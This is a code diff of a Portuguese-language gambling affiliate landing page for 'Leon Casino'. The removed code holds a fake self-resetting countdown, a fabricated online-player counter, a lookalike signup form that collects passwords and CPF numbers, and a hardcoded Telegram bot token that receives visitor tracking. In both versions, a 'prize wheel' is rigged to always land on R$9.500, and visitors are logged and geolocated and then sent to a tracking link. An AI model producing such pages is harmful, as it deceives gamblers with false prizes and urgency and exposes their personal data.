@@ -3,1274 +3,161 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="Ganhe até R$9.500 em bônus no Leon Casino. Cadastre-se agora e receba 120 rodadas grátis no Fortune Tiger!">
-<title>Fortuna Rex — Bônus até R$9.500</title>
-<link rel="preload" as="image" href="hero.webp">
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<title>Roda da Fortuna — Leon</title>
+<meta name="description" content="Gire a roda e receba seu bonus de boas-vindas.">
 <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@700;900&display=swap" rel="stylesheet">
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; }
-
+html, body { height: 100%; }
 body {
   font-family: 'Montserrat', 'Segoe UI', Arial, sans-serif;
-  background: #0A0A1A;
-  color: #fff;
-  max-width: 430px;
-  margin: 0 auto;
-  overflow-x: hidden;
-  padding-bottom: 90px;
+  background: radial-gradient(circle at 50% 30%, #2d1060 0%, #0A0A1A 70%);
+  color: #fff; min-height: 100%;
+  display: flex; align-items: center; justify-content: center;
+  overflow: hidden; padding: 20px;
 }
-
-/* Главное изображение */
-.hero-img {
-  width: 100%;
-  display: block;
-}
-
-/* Фиксированная кнопка снизу */
-.fixed-cta {
-  position: fixed;
-  bottom: 0; left: 50%;
-  transform: translateX(-50%);
-  width: 100%;
-  max-width: 430px;
-  z-index: 100;
-  padding: 10px 16px 16px;
-  background: linear-gradient(to top, #0A0A1A 80%, transparent);
-}
-
-.btn-main {
-  display: block;
-  width: 100%;
-  background: linear-gradient(135deg, #00C853, #00E676);
-  color: #000;
-  font-family: 'Montserrat', sans-serif;
-  font-size: 18px;
-  font-weight: 900;
-  text-align: center;
-  padding: 16px 20px 12px;
-  border-radius: 14px;
-  text-decoration: none;
-  letter-spacing: 0.5px;
-  box-shadow: 0 4px 30px rgba(0,200,83,0.5);
-  border: none;
-  cursor: pointer;
-  margin-bottom: 8px;
-}
-
-.btn-main span {
-  display: block;
-  font-size: 11px;
-  font-weight: 400;
-  opacity: 0.8;
-  margin-top: 2px;
-}
-
-.btn-telegram {
-  display: block;
-  width: 100%;
-  background: linear-gradient(135deg, #5B4FCF, #7B68EE);
-  color: #fff;
-  font-family: 'Montserrat', sans-serif;
-  font-size: 15px;
-  font-weight: 700;
-  text-align: center;
-  padding: 13px 20px;
-  border-radius: 12px;
-  text-decoration: none;
-  box-shadow: 0 4px 20px rgba(91,79,207,0.4);
-}
-
-/* Кнопка копирования промокода */
-.promo-section {
-  background: #0A0A1A;
-  padding: 20px 16px;
-  text-align: center;
-}
-
-.promo-box {
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  background: rgba(255,215,0,0.08);
-  border: 2px dashed rgba(255,215,0,0.5);
-  border-radius: 12px;
-  padding: 14px 16px;
-  margin-bottom: 12px;
-}
-
-.promo-text {
-  font-size: 13px;
-  color: rgba(255,255,255,0.6);
-}
-
-.promo-code {
-  font-size: 22px;
-  font-weight: 900;
-  color: #FFD700;
-  letter-spacing: 3px;
-}
-
-.copy-btn {
-  background: #00C853;
-  color: #000;
-  border: none;
-  border-radius: 8px;
-  padding: 10px 16px;
-  font-family: 'Montserrat', sans-serif;
-  font-weight: 700;
-  font-size: 13px;
-  cursor: pointer;
-  white-space: nowrap;
-}
-
-.copy-btn.copied {
-  background: #FFD700;
-}
-
-/* Таймер поверх картинки */
-.timer-overlay {
-  background: #0A0A1A;
-  padding: 16px;
-  text-align: center;
-  border-bottom: 1px solid rgba(255,215,0,0.15);
-}
-
-.timer-label {
-  font-size: 11px;
-  color: rgba(255,255,255,0.5);
-  text-transform: uppercase;
-  letter-spacing: 2px;
-  margin-bottom: 8px;
-}
-
-.timer-digits {
-  display: flex;
-  justify-content: center;
-  gap: 8px;
-  align-items: center;
-}
-
-.timer-block {
-  background: rgba(255,0,0,0.15);
-  border: 1px solid rgba(255,0,0,0.3);
-  border-radius: 10px;
-  padding: 10px 16px;
-  min-width: 64px;
-}
-
-.timer-num {
-  font-size: 30px;
-  font-weight: 900;
-  color: #FF4444;
-  font-variant-numeric: tabular-nums;
-  line-height: 1;
-}
-
-.timer-unit {
-  font-size: 9px;
-  color: rgba(255,255,255,0.4);
-  text-transform: uppercase;
-  letter-spacing: 1px;
-  margin-top: 4px;
-}
-
-.timer-sep {
-  font-size: 28px;
-  font-weight: 900;
-  color: #FF4444;
-  margin-bottom: 16px;
-}
-
-/* Онлайн */
-.online-bar {
-  background: rgba(0,200,83,0.08);
-  border-top: 1px solid rgba(0,200,83,0.2);
-  border-bottom: 1px solid rgba(0,200,83,0.2);
-  padding: 10px 16px;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  gap: 8px;
-  font-size: 13px;
-  font-weight: 700;
-  color: #00E676;
-}
-
-.dot {
-  width: 8px;
-  height: 8px;
-  background: #00E676;
-  border-radius: 50%;
-  animation: blink 1.5s infinite;
-}
-
-@keyframes blink {
-  0%,100% { opacity: 1; }
-  50% { opacity: 0.2; }
-}
-
-/* Popup при копировании */
-.toast {
-  position: fixed;
-  top: 20px;
-  left: 50%;
-  transform: translateX(-50%);
-  background: #00C853;
-  color: #000;
-  font-weight: 700;
-  padding: 12px 24px;
-  border-radius: 30px;
-  font-size: 14px;
-  z-index: 200;
-  opacity: 0;
-  transition: opacity 0.3s;
-  pointer-events: none;
-}
-
-.toast.show { opacity: 1; }
-
-/* Сброс фона */
-body { background: #0A0A1A !important; }
-
-/* Герой */
-.hero-new {
-  width: 100%;
-  display: block;
-  border-bottom: 3px solid #FFD700;
-}
-
-/* Слоты */
-.slots-img {
-  width: 100%;
-  display: block;
-  margin-top: 10px;
-  border-radius: 12px;
-  padding: 0 8px;
-  box-sizing: border-box;
-}
-
-/* Отзывы */
-.reviews-img {
-  width: 100%;
-  display: block;
-  margin-top: 10px;
-  border-radius: 12px;
-  padding: 0 8px;
-  box-sizing: border-box;
-}
-
-
-/* ===== КОЛЕСО ФОРТУНЫ ===== */
-.wheel-overlay {
-  position: fixed;
-  inset: 0;
-  background: rgba(0,0,0,0.88);
-  z-index: 999;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
-  padding: 20px;
-}
-.wheel-title {
-  font-family: 'Montserrat', sans-serif;
-  font-size: 20px;
-  font-weight: 900;
-  color: #FFD700;
-  text-align: center;
-  margin-bottom: 6px;
-  text-shadow: 0 0 20px rgba(255,215,0,0.6);
-}
-.wheel-sub {
-  font-size: 13px;
-  color: rgba(255,255,255,0.7);
-  text-align: center;
-  margin-bottom: 18px;
-}
-.wheel-wrap {
-  position: relative;
-  width: 290px;
-  height: 290px;
-}
-.wheel-arrow {
-  position: absolute;
-  top: -18px;
-  left: 50%;
-  transform: translateX(-50%);
-  font-size: 32px;
-  z-index: 10;
-  filter: drop-shadow(0 2px 6px rgba(0,0,0,0.8));
-}
-#wheelCanvas {
-  border-radius: 50%;
-  box-shadow: 0 0 40px rgba(255,215,0,0.5), 0 0 80px rgba(255,100,0,0.2);
-}
-.wheel-btn {
-  margin-top: 22px;
-  background: linear-gradient(135deg, #FFD700, #FF8C00);
-  color: #000;
-  font-family: 'Montserrat', sans-serif;
-  font-size: 18px;
-  font-weight: 900;
-  padding: 16px 48px;
-  border-radius: 50px;
-  border: none;
-  cursor: pointer;
-  box-shadow: 0 4px 30px rgba(255,180,0,0.6);
-  letter-spacing: 1px;
-  animation: btnpulse 1.5s ease-in-out infinite;
-}
-@keyframes btnpulse {
-  0%,100% { box-shadow: 0 4px 30px rgba(255,180,0,0.6); }
-  50%      { box-shadow: 0 4px 50px rgba(255,180,0,0.9); }
-}
-.wheel-btn:disabled {
-  opacity: 0.6;
-  animation: none;
-  cursor: not-allowed;
-}
-
-/* Попап победы */
-.win-popup {
-  display: none;
-  position: fixed;
-  inset: 0;
-  background: rgba(0,0,0,0.92);
-  z-index: 1000;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
-  padding: 30px;
-}
+.wheel-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; width: 100%; max-width: 400px; }
+.wheel-title { font-size: 22px; font-weight: 900; color: #FFD700; margin-bottom: 6px; text-shadow: 0 0 20px rgba(255,215,0,0.6); }
+.wheel-sub { font-size: 14px; color: rgba(255,255,255,0.7); margin-bottom: 22px; }
+.wheel-wrap { position: relative; width: 300px; height: 300px; }
+.wheel-arrow { position: absolute; top: -18px; left: 50%; transform: translateX(-50%); font-size: 34px; z-index: 10; filter: drop-shadow(0 2px 6px rgba(0,0,0,0.8)); }
+#wheelCanvas { border-radius: 50%; box-shadow: 0 0 45px rgba(255,215,0,0.5), 0 0 90px rgba(255,100,0,0.2); }
+.wheel-btn { margin-top: 26px; background: linear-gradient(135deg, #FFD700, #FF8C00); color: #000; font-family: inherit; font-size: 19px; font-weight: 900; padding: 17px 52px; border-radius: 50px; border: none; cursor: pointer; box-shadow: 0 4px 30px rgba(255,180,0,0.6); letter-spacing: 1px; animation: btnpulse 1.5s ease-in-out infinite; }
+@keyframes btnpulse { 0%,100% { box-shadow: 0 4px 30px rgba(255,180,0,0.6); } 50% { box-shadow: 0 4px 50px rgba(255,180,0,0.95); } }
+.wheel-btn:disabled { opacity: 0.6; animation: none; cursor: not-allowed; }
+.win-popup { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.92); z-index: 1000; flex-direction: column; align-items: center; justify-content: center; padding: 30px; }
 .win-popup.show { display: flex; }
-.win-box {
-  background: linear-gradient(135deg, #1a0a3a, #2d1060);
-  border: 3px solid #FFD700;
-  border-radius: 24px;
-  padding: 30px 24px;
-  text-align: center;
-  max-width: 340px;
-  width: 100%;
-  box-shadow: 0 0 60px rgba(255,215,0,0.4);
-}
-.win-emoji { font-size: 52px; margin-bottom: 10px; }
-.win-title {
-  font-family: 'Montserrat', sans-serif;
-  font-size: 22px;
-  font-weight: 900;
-  color: #FFD700;
-  margin-bottom: 6px;
-}
-.win-prize {
-  font-family: 'Montserrat', sans-serif;
-  font-size: 36px;
-  font-weight: 900;
-  color: #fff;
-  margin: 10px 0;
-  text-shadow: 0 0 20px rgba(255,215,0,0.8);
-}
-.win-sub {
-  font-size: 14px;
-  color: rgba(255,255,255,0.7);
-  margin-bottom: 24px;
-}
-.win-cta {
-  display: block;
-  width: 100%;
-  background: linear-gradient(135deg, #00C853, #00E676);
-  color: #000;
-  font-family: 'Montserrat', sans-serif;
-  font-size: 17px;
-  font-weight: 900;
-  padding: 16px;
-  border-radius: 14px;
-  text-decoration: none;
-  text-align: center;
-  box-shadow: 0 4px 30px rgba(0,200,83,0.5);
-  margin-bottom: 10px;
-}
-.win-timer {
-  font-size: 12px;
-  color: #FF4444;
-  margin-top: 8px;
-}
-
-
-/* ===== ФОРМА КАЗИНО ===== */
-.casino-overlay {
-  position: fixed;
-  inset: 0;
-  background: rgba(0,0,0,0.95);
-  z-index: 1001;
-  display: none;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
-  padding: 16px;
-}
-.casino-overlay.show { display: flex; }
-
-.casino-box {
-  background: #1a1f2e;
-  border-radius: 16px;
-  padding: 0;
-  max-width: 360px;
-  width: 100%;
-  overflow: hidden;
-  box-shadow: 0 0 60px rgba(0,0,0,0.8);
-}
-
-.casino-header {
-  background: linear-gradient(135deg, #8B0000, #CC0000);
-  padding: 16px;
-  text-align: center;
-  position: relative;
-}
-.casino-header img { display: none; }
-.casino-header-title {
-  font-size: 20px;
-  font-weight: 900;
-  color: #FFD700;
-  font-family: 'Montserrat', sans-serif;
-}
-.casino-header-sub {
-  font-size: 13px;
-  color: rgba(255,255,255,0.8);
-  margin-top: 4px;
-}
-.casino-bonus-badge {
-  background: linear-gradient(135deg, #FFD700, #FF8C00);
-  color: #000;
-  font-weight: 900;
-  font-size: 22px;
-  padding: 8px 20px;
-  border-radius: 8px;
-  display: inline-block;
-  margin-top: 8px;
-  font-family: 'Montserrat', sans-serif;
-}
-
-.casino-tabs {
-  display: flex;
-  border-bottom: 1px solid rgba(255,255,255,0.1);
-  background: #1a1f2e;
-}
-.casino-tab {
-  flex: 1;
-  padding: 12px;
-  text-align: center;
-  font-size: 13px;
-  font-weight: 700;
-  color: rgba(255,255,255,0.5);
-  cursor: pointer;
-  font-family: 'Montserrat', sans-serif;
-  border-bottom: 2px solid transparent;
-}
-.casino-tab.active {
-  color: #00C853;
-  border-bottom: 2px solid #00C853;
-}
-
-.casino-form {
-  padding: 16px;
-}
-.casino-label {
-  font-size: 12px;
-  color: rgba(255,255,255,0.6);
-  margin-bottom: 6px;
-  display: block;
-  font-family: 'Montserrat', sans-serif;
-}
-.casino-input {
-  width: 100%;
-  padding: 13px 14px;
-  background: #252b3d;
-  border: 1px solid rgba(255,255,255,0.1);
-  border-radius: 8px;
-  color: #fff;
-  font-size: 14px;
-  font-family: 'Montserrat', sans-serif;
-  margin-bottom: 12px;
-  box-sizing: border-box;
-  outline: none;
-}
-.casino-input:focus {
-  border-color: #00C853;
-}
-.casino-input::placeholder { color: rgba(255,255,255,0.3); }
-
-.casino-row {
-  display: grid;
-  grid-template-columns: 1fr 1fr;
-  gap: 10px;
-}
-
-.casino-select {
-  width: 100%;
-  padding: 13px 14px;
-  background: #252b3d;
-  border: 1px solid rgba(255,255,255,0.1);
-  border-radius: 8px;
-  color: #fff;
-  font-size: 13px;
-  font-family: 'Montserrat', sans-serif;
-  margin-bottom: 12px;
-  box-sizing: border-box;
-  outline: none;
-  appearance: none;
-}
-
-.casino-promo-row {
-  display: flex;
-  gap: 8px;
-  align-items: center;
-  margin-bottom: 12px;
-}
-.casino-promo-link {
-  font-size: 12px;
-  color: #00C853;
-  text-decoration: underline;
-  cursor: pointer;
-  white-space: nowrap;
-}
-.promo-input-wrap {
-  position: relative;
-  flex: 1;
-}
-.promo-input-wrap .casino-input {
-  margin-bottom: 0;
-  background: rgba(0,200,83,0.08);
-  border-color: rgba(0,200,83,0.3);
-  color: #00E676;
-  font-weight: 700;
-}
-
-.casino-register-btn {
-  width: 100%;
-  padding: 16px;
-  background: linear-gradient(135deg, #00C853, #00E676);
-  color: #000;
-  font-family: 'Montserrat', sans-serif;
-  font-size: 16px;
-  font-weight: 900;
-  border: none;
-  border-radius: 10px;
-  cursor: pointer;
-  box-shadow: 0 4px 20px rgba(0,200,83,0.4);
-  margin-bottom: 10px;
-}
-.casino-terms {
-  font-size: 10px;
-  color: rgba(255,255,255,0.3);
-  text-align: center;
-  line-height: 1.4;
-}
-.casino-terms a { color: rgba(255,255,255,0.5); }
-
-.casino-close {
-  position: absolute;
-  top: 12px;
-  right: 12px;
-  color: rgba(255,255,255,0.6);
-  font-size: 20px;
-  cursor: pointer;
-  background: none;
-  border: none;
-  padding: 4px;
-}
-
-/* Ретаргетинг */
-.retarget-popup {
-  position: fixed;
-  bottom: 100px;
-  left: 50%;
-  transform: translateX(-50%);
-  background: linear-gradient(135deg, #1a0a3a, #2d1060);
-  border: 2px solid #FFD700;
-  border-radius: 16px;
-  padding: 16px 20px;
-  max-width: 340px;
-  width: calc(100% - 32px);
-  z-index: 500;
-  display: none;
-  box-shadow: 0 8px 40px rgba(255,215,0,0.3);
-  animation: slideUp 0.4s ease;
-}
-.retarget-popup.show { display: block; }
-@keyframes slideUp {
-  from { transform: translateX(-50%) translateY(20px); opacity: 0; }
-  to   { transform: translateX(-50%) translateY(0); opacity: 1; }
-}
-.retarget-text {
-  font-size: 14px;
-  font-weight: 700;
-  color: #fff;
-  margin-bottom: 10px;
-  font-family: 'Montserrat', sans-serif;
-}
-.retarget-text span { color: #FFD700; }
-.retarget-btns { display: flex; gap: 8px; }
-.retarget-yes {
-  flex: 1;
-  padding: 10px;
-  background: linear-gradient(135deg, #00C853, #00E676);
-  color: #000;
-  font-weight: 900;
-  font-size: 13px;
-  border: none;
-  border-radius: 8px;
-  cursor: pointer;
-  font-family: 'Montserrat', sans-serif;
-}
-.retarget-no {
-  padding: 10px 14px;
-  background: rgba(255,255,255,0.1);
-  color: rgba(255,255,255,0.6);
-  font-size: 12px;
-  border: none;
-  border-radius: 8px;
-  cursor: pointer;
-  font-family: 'Montserrat', sans-serif;
-}
-
+.win-box { background: linear-gradient(135deg, #1a0a3a, #2d1060); border: 3px solid #FFD700; border-radius: 24px; padding: 32px 24px; text-align: center; max-width: 340px; width: 100%; box-shadow: 0 0 60px rgba(255,215,0,0.4); }
+.win-emoji { font-size: 54px; margin-bottom: 10px; }
+.win-title { font-size: 22px; font-weight: 900; color: #FFD700; margin-bottom: 6px; }
+.win-prize { font-size: 38px; font-weight: 900; color: #fff; margin: 10px 0; text-shadow: 0 0 20px rgba(255,215,0,0.8); }
+.win-sub { font-size: 14px; color: rgba(255,255,255,0.7); margin-bottom: 24px; }
+.win-cta { display: block; width: 100%; background: linear-gradient(135deg, #00C853, #00E676); color: #000; font-size: 17px; font-weight: 900; padding: 17px; border-radius: 14px; text-decoration: none; text-align: center; box-shadow: 0 4px 30px rgba(0,200,83,0.5); }
 </style>
 </head>
 <body>
 
-<!-- ФОРМА КАЗИНО -->
-<div class="casino-overlay" id="casinoOverlay">
-  <div class="casino-box">
-    <!-- Хедер -->
-    <div class="casino-header">
-      <button class="casino-close" onclick="closeCasinoForm()">✕</button>
-      <div class="casino-header-title">🎰 LEON CASINO</div>
-      <div class="casino-header-sub">Cadastre-se e ganhe seu prêmio!</div>
-      <div class="casino-bonus-badge">R$ 9.500 + 120 RG</div>
-    </div>
-
-    <!-- Табы -->
-    <div class="casino-tabs">
-      <div class="casino-tab active">POR E-MAIL</div>
-      <div class="casino-tab" style="opacity:0.4">POR TELEFONE</div>
-    </div>
-
-    <!-- Форма -->
-    <div class="casino-form">
-      <label class="casino-label">E-mail</label>
-      <input type="email" class="casino-input" id="casinoEmail" placeholder="Digite seu e-mail">
-
-      <label class="casino-label">Senha</label>
-      <input type="password" class="casino-input" id="casinoSenha" placeholder="Digite sua senha">
-
-      <div class="casino-row">
-        <div>
-          <label class="casino-label">País</label>
-          <select class="casino-select">
-            <option>🇧🇷 Brasil</option>
-          </select>
-        </div>
-        <div>
-          <label class="casino-label">Moeda</label>
-          <select class="casino-select">
-            <option>R$ - Real brasileiro</option>
-          </select>
-        </div>
-      </div>
-
-      <label class="casino-label">CPF</label>
-      <input type="text" class="casino-input" id="casinoCPF" placeholder="000.000.000-00" maxlength="14">
-
-      <label class="casino-label">
-        <span class="casino-promo-link">Código de bônus</span> (aplicado automaticamente)
-      </label>
-      <div class="promo-input-wrap">
-        <input type="text" class="casino-input" value="KYJKQOH" readonly>
-      </div>
-      <br>
-
-      <button class="casino-register-btn" onclick="submitCasinoForm()">
-        Cadastre-se
-      </button>
-
-      <div class="casino-terms">
-        Ao clicar no botão "Cadastre-se", você confirma que atingiu a maioridade.
-        <a href="#">Termos e Condições</a>
-      </div>
-    </div>
-  </div>
-</div>
-
-<!-- РЕТАРГЕТИНГ -->
-<div class="retarget-popup" id="retargetPopup">
-  <div class="retarget-text">
-    ⏰ Seu prêmio <span>R$9.500</span> ainda está disponível!<br>
-    <small style="color:rgba(255,255,255,0.5)">Expira em breve. Deseja resgatar?</small>
-  </div>
-  <div class="retarget-btns">
-    <button class="retarget-yes" onclick="retargetYes()">✅ SIM, QUERO!</button>
-    <button class="retarget-no" onclick="retargetNo()">Não</button>
-  </div>
-</div>
-
-
-<!-- КОЛЕСО ФОРТУНЫ -->
-<div class="wheel-overlay" id="wheelOverlay">
-  <div class="wheel-title">🎡 GIRE A RODA DA FORTUNA!</div>
-  <div class="wheel-sub">Todos os jogadores ganham um prêmio especial</div>
+<div class="wheel-screen" id="wheelScreen">
+  <div class="wheel-title">GIRE A RODA DA FORTUNA</div>
+  <div class="wheel-sub">Gire e receba seu bonus de boas-vindas</div>
   <div class="wheel-wrap">
-    <div class="wheel-arrow">▼</div>
-    <canvas id="wheelCanvas" width="290" height="290"></canvas>
+    <div class="wheel-arrow">&#9660;</div>
+    <canvas id="wheelCanvas" width="300" height="300"></canvas>
   </div>
-  <button class="wheel-btn" id="spinBtn" onclick="spinWheel()">🎰 GIRAR AGORA</button>
+  <button class="wheel-btn" id="spinBtn" onclick="spinWheel()">GIRAR AGORA</button>
 </div>
 
-<!-- ПОПАП ПОБЕДЫ -->
 <div class="win-popup" id="winPopup">
   <div class="win-box">
-    <div class="win-emoji">🎉</div>
-    <div class="win-title">PARABÉNS! VOCÊ GANHOU!</div>
+    <div class="win-emoji">&#127881;</div>
+    <div class="win-title">PARABENS!</div>
     <div class="win-prize" id="winPrize">R$ 9.500</div>
-    <div class="win-sub">+ 120 Rodadas Grátis no Fortune Tiger!<br>Resgate agora antes que expire!</div>
-    <a href="#" class="win-cta" id="winCta">🎰 RESGATAR MEU PRÊMIO</a>
-    <div class="win-timer" id="winTimer">⏰ Expira em: <b id="winCountdown">05:00</b></div>
+    <div class="win-sub">Cadastre-se para resgatar seu bonus.</div>
+    <a href="#" class="win-cta" id="winCta" target="_top">RESGATAR AGORA</a>
   </div>
-</div>
-
-
-<!-- Тост уведомление -->
-<div class="toast" id="toast">✅ Código copiado!</div>
-
-<!-- Главное изображение (вся инфографика) -->
-<img class="hero-new" src="hero.webp" width="750" height="1048" alt="Fortuna Rex — Bônus R$9.500" alt="Fortuna Rex">
-
-
-<!-- Слоты -->
-<img class="slots-img" src="slots.webp" width="751" height="524" alt="Fortune Tiger Slots" loading="lazy" alt="Slots">
-
-<!-- Отзывы -->
-<img class="reviews-img" src="reviews.webp" width="751" height="524" alt="Jogadores Reviews" loading="lazy" alt="Отзывы">
-
-<!-- Таймер -->
-<div class="timer-overlay">
-  <div class="timer-label">⏰ Oferta expira em</div>
-  <div class="timer-digits">
-    <div class="timer-block">
-      <div class="timer-num" id="th">23</div>
-      <div class="timer-unit">Horas</div>
-    </div>
-    <div class="timer-sep">:</div>
-    <div class="timer-block">
-      <div class="timer-num" id="tm">59</div>
-      <div class="timer-unit">Minutos</div>
-    </div>
-    <div class="timer-sep">:</div>
-    <div class="timer-block">
-      <div class="timer-num" id="ts">47</div>
-      <div class="timer-unit">Segundos</div>
-    </div>
-  </div>
-</div>
-
-<!-- Онлайн -->
-<div class="online-bar">
-  <div class="dot"></div>
-  <span id="online">847</span> jogadores online agora
-</div>
-
-<!-- Промокод с кнопкой -->
-<div class="promo-section">
-  <div class="promo-box">
-    <div>
-      <div class="promo-text">🏷 Código Promocional</div>
-      <div class="promo-code">KYJKQOH</div>
-    </div>
-    <button class="copy-btn" id="copyBtn" onclick="copyPromo()">📋 COPIAR</button>
-  </div>
-</div>
-
-<!-- Фиксированные кнопки -->
-<div class="fixed-cta">
-  <a href="https://track.luxeprofit.pro/click?pid=2137&offer_id=2457&l=1785345481" class="btn-main">
-    🎰 RESGATAR BÔNUS AGORA
-    <span>Acesso instantâneo • 100% seguro</span>
-  </a>
-  <a href="https://t.me/FortunaRex_bot" class="btn-telegram">
-    ✈️ Ver catálogo no Telegram →
-  </a>
 </div>
 
 <script>
-// Таймер
-let h = 23, m = 59, s = 47;
-function tick() {
-  s--;
-  if (s < 0) { s = 59; m--; }
-  if (m < 0) { m = 59; h--; }
-  if (h < 0) { h = 23; m = 59; s = 59; }
-  document.getElementById('th').textContent = String(h).padStart(2,'0');
-  document.getElementById('tm').textContent = String(m).padStart(2,'0');
-  document.getElementById('ts').textContent = String(s).padStart(2,'0');
-}
-setInterval(tick, 1000);
+var TRACK = 'https://track.luxeprofit.pro/click?pid=2137&offer_id=2457&l=1785345394';
+var SHEETS = 'https://script.google.com/macros/s/AKfycby6K0PI6L4a17Xg2IN30xuTcBCVQJFwqmRKjm6nXdaQAr5QulxN6irnLPol7rK88QUV/exec';
 
-// Онлайн счётчик
-let online = 847;
-setInterval(() => {
-  online += Math.floor(Math.random() * 7) - 3;
-  online = Math.max(820, Math.min(880, online));
-  document.getElementById('online').textContent = online;
-}, 3000);
+var p = new URLSearchParams(location.search);
+var sub1 = p.get('sub1') || '';
+var sub2 = p.get('sub2') || '';
+var sub3 = p.get('sub3') || '';
+var campaign = p.get('campaign') || '';
+var t0 = Date.now();
+var device = /mobile|android|iphone|ipad/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+var country = '';
 
-// Копирование промокода
-function copyPromo() {
-  navigator.clipboard.writeText('KYJKQOH').then(() => {
-    const btn = document.getElementById('copyBtn');
-    btn.textContent = '✅ COPIADO!';
-    btn.classList.add('copied');
-    const toast = document.getElementById('toast');
-    toast.classList.add('show');
-    setTimeout(() => {
-      btn.textContent = '📋 COPIAR';
-      btn.classList.remove('copied');
-      toast.classList.remove('show');
-    }, 2000);
-  });
+function buildLink() {
+  var u = TRACK;
+  if (sub1) u += '&sub1=' + encodeURIComponent(sub1);
+  if (sub2) u += '&sub2=' + encodeURIComponent(sub2);
+  if (sub3) u += '&sub3=' + encodeURIComponent(sub3);
+  return u;
 }
 
+function logEvent(event) {
+  var sec = Math.round((Date.now() - t0) / 1000);
+  if (!SHEETS) return;
+  var q = new URLSearchParams({ event: event, sub1: sub1, click_id: sub2, campaign: campaign, country: country, device: device, time_sec: String(sec) });
+  try { fetch(SHEETS + '?' + q.toString()).catch(function(){}); } catch(e){}
+}
 
+fetch('https://ipapi.co/json/').then(function(r){return r.json();})
+  .then(function(d){ country = d.country_code || ''; logEvent('visit'); })
+  .catch(function(){ logEvent('visit'); });
 
+window.addEventListener('pagehide', function(){ logEvent('page_leave'); });
 
-(function(){
-  var BOT='8990797670:AAECHVdiTOAE29W4QI56NcMvPdAtLEKz3VI', CHAT='2026776037';
-  var t0=Date.now();
-  function tg(txt){ fetch('https://api.telegram.org/bot'+BOT+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT,text:txt,parse_mode:'HTML'})}).catch(()=>{}); }
-  var p=new URLSearchParams(location.search);
-  var z=p.get('sub1')||'—', c=p.get('sub2')||'—';
-  var dev=/mobile|android|iphone/i.test(navigator.userAgent)?'📱 Телефон':'🖥 Десктоп';
-  var country='—';
-  fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=>{
-    country=(d.country_name||'—')+' '+(d.emoji_flag||'');
-    tg('👁 <b>Новый визит</b>\n📅 '+new Date().toLocaleString('ru-RU')+'\n🌍 Zone: '+z+'\n🔗 Click: '+c+'\n'+dev+'\n🗺 '+country);
-  }).catch(()=>tg('👁 <b>Новый визит</b>\n📅 '+new Date().toLocaleString('ru-RU')+'\n🌍 Zone: '+z+'\n🔗 Click: '+c+'\n'+dev));
-
-  var base='https://track.luxeprofit.pro/click?pid=2137&offer_id=2457&l=1785345481';
-  if(p.get('sub1')) base+='&sub1='+encodeURIComponent(p.get('sub1'));
-  if(p.get('sub2')) base+='&sub2='+encodeURIComponent(p.get('sub2'));
-  if(p.get('sub3')) base+='&sub3='+encodeURIComponent(p.get('sub3'));
-
-  var cta=document.querySelector('.btn-main');
-  if(cta){ cta.href=base; cta.addEventListener('click',function(){
-    var sec=Math.round((Date.now()-t0)/1000);
-    tg('🖱 <b>Клик RESGATAR</b>\n📅 '+new Date().toLocaleString('ru-RU')+'\n🌍 Zone: '+z+'\n🔗 Click: '+c+'\n'+dev+'\n🗺 '+country+'\n⏱ '+sec+' сек');
-  }); }
-
-  document.getElementById('copyBtn')&&document.getElementById('copyBtn').addEventListener('click',function(){
-    tg('📋 <b>Промокод скопирован</b>\n🌍 Zone: '+z+'\n'+dev+'\n🗺 '+country);
-  });
-
-  window.addEventListener('beforeunload',function(){
-    var sec=Math.round((Date.now()-t0)/1000);
-    tg('🚪 <b>Покинул страницу</b>\n⏱ '+sec+' сек\n🌍 Zone: '+z+'\n'+dev+'\n🗺 '+country);
-  });
-})();
-
-
-// ===== КОЛЕСО ФОРТУНЫ =====
 var segments = [
   { label: 'R$9.500',     color: '#8B0000', text: '#FFD700' },
   { label: '120 Rodadas', color: '#4B0082', text: '#fff'    },
   { label: 'R$500',       color: '#006400', text: '#FFD700' },
   { label: 'R$2.000',     color: '#8B4513', text: '#FFD700' },
-  { label: 'BÔNUS VIP',   color: '#00008B', text: '#FFD700' },
+  { label: 'BONUS VIP',   color: '#00008B', text: '#FFD700' },
   { label: 'R$1.500',     color: '#8B0000', text: '#FFD700' },
   { label: 'R$9.500',     color: '#4B0082', text: '#FFD700' },
-  { label: '50 Rodadas',  color: '#006400', text: '#fff'    },
-]
-
-var winIndex = 0; // всегда R$9.500
+  { label: '50 Rodadas',  color: '#006400', text: '#fff'    }
+];
+var winIndex = 0;
 var canvas = document.getElementById('wheelCanvas');
 var ctx = canvas && canvas.getContext('2d');
-var currentAngle = 0;
-var isSpinning = false;
+var currentAngle = 0, isSpinning = false;
 
 function drawWheel(angle) {
   if (!ctx) return;
-  var cx = 145, cy = 145, r = 138;
-  var n = segments.length;
-  var arc = (2 * Math.PI) / n;
-  ctx.clearRect(0, 0, 290, 290);
-
-  // Внешнее кольцо
-  ctx.beginPath();
-  ctx.arc(cx, cy, r + 6, 0, 2*Math.PI);
-  var gld = ctx.createLinearGradient(0,0,290,290);
-  gld.addColorStop(0,'#FFD700'); gld.addColorStop(1,'#FF8C00');
-  ctx.fillStyle = gld;
-  ctx.fill();
-
+  var cx = 150, cy = 150, r = 142, n = segments.length, arc = (2*Math.PI)/n;
+  ctx.clearRect(0, 0, 300, 300);
+  ctx.beginPath(); ctx.arc(cx, cy, r + 6, 0, 2*Math.PI);
+  var gld = ctx.createLinearGradient(0,0,300,300); gld.addColorStop(0,'#FFD700'); gld.addColorStop(1,'#FF8C00');
+  ctx.fillStyle = gld; ctx.fill();
   segments.forEach(function(seg, i) {
-    var start = angle + i * arc;
-    var end   = start + arc;
-    ctx.beginPath();
-    ctx.moveTo(cx, cy);
